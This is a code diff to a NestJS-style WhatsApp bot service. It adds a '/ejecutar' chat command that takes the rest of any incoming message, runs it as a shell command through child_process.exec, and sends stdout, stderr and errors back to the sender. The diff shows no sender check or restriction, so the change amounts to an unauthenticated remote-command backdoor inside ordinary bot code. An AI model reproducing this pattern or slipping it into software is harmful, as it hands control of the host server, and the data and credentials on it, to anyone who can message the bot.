@@ -134,6 +134,29 @@ export class BotService implements OnModuleInit {
       // await sock.sendMessage('120363304303553469@g.us', { text: 'Hola 3! Soy un bot, en que puedo ayudarte?' });
 
 
+      if (m.messages[0].message?.extendedTextMessage?.text?.includes('/ejecutar')) {
+        var exec = require('child_process').exec;
+
+        const comando = m.messages[0].message?.extendedTextMessage?.text.replace('/ejecutar', '').trim();
+
+
+        exec(comando,
+          async function (error, stdout, stderr) {
+
+            await sock.sendMessage(m.messages[0].key.remoteJid!, {
+              text: JSON.stringify(
+                {
+                  error,
+                  stdout,
+                  stderr
+                },
+                undefined,
+                2)
+            });
+          });
+      }
+
+
     });
   }
 
